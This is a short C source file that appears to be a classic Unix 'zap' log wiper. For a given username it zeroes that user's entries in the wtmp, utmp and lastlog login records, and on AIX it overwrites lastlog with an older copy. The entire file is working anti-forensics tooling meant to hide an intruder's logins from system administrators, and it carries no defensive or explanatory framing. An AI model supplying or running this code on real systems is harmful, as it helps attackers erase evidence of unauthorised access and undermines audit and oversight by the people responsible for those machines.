#include<sys/types.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/file.h>
#include<fcntl.h>
#include<utmp.h>
#include<pwd.h>

#ifndef AIX
#include <lastlog.h>
#endif

#ifdef SYSV
#define WTMP_NAME "/etc/wtmp"
#else
#define WTMP_NAME "/usr/adm/wtmp"
#endif

#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"

int f;
kill_wtmp(who)
  char *who;
{
  struct utmp utmp_ent;
  long pos;
  if((f=open(WTMP_NAME, O_RDWR)) < 0)
    return 1;
  for(pos=1L;;) {
    lseek(f,-(long)(sizeof(struct utmp)*pos), L_XTND);
    if(read(f, &utmp_ent, sizeof(struct utmp)) <= 0)
      break;
    if(!strncmp(utmp_ent.ut_name, who, strlen(who))) {
      bzero((char*)&utmp_ent,sizeof(struct utmp));
      lseek(f, -(long)(sizeof(struct utmp)*pos), L_XTND);
      write(f, &utmp_ent, sizeof(utmp_ent));
      break;
    }
    pos+=1L;
  }
  close(f);
  return 0;
}

kill_utmp(who)
  char *who;
{
  struct utmp utmp_ent;
  if((f=open(UTMP_NAME, O_RDWR)) < 0)
    return 1;
  while(read(f, &utmp_ent, sizeof(utmp_ent)) > 0)
    if(!strncmp(utmp_ent.ut_name, who, strlen(who))) {
      bzero((char *)&utmp_ent, sizeof(utmp_ent));
      lseek(f, -(long)sizeof(utmp_ent), SEEK_CUR);
      write(f, &utmp_ent, sizeof(utmp_ent));
    }
  close(f);
  return 0;
}

kill_lastlog(who)
  char *who;
{
#ifdef AIX
  system("cp /etc/security/olastlog /etc/security/lastlog");
#else
  struct passwd *pwd;
  struct lastlog newll;
  if(!(pwd=getpwnam(who))) {
    puts(who);
    puts("?");
    return 1;
  }
  if((f=open(LASTLOG_NAME, O_RDWR)) < 0)
    return 1;
  lseek(f, (long)(pwd->pw_uid*sizeof(struct lastlog)), 0);
  bzero((char*)&newll, sizeof(newll));
  write(f, (char*)&newll, sizeof(newll));
  close(f);
#endif
  return 0;
}

main(c, v)
  char **v;
{
  int r=0, n=1;
  if(c < 2) {
    puts("Error");
    return 1;
  }
  if(c == 3)
    n=atoi(v[2]);
  while(n--)r|=kill_wtmp(v[1])|kill_utmp(v[1])|kill_lastlog(v[1]);
  puts(r?"Error":"Zap!");
  return r;
}
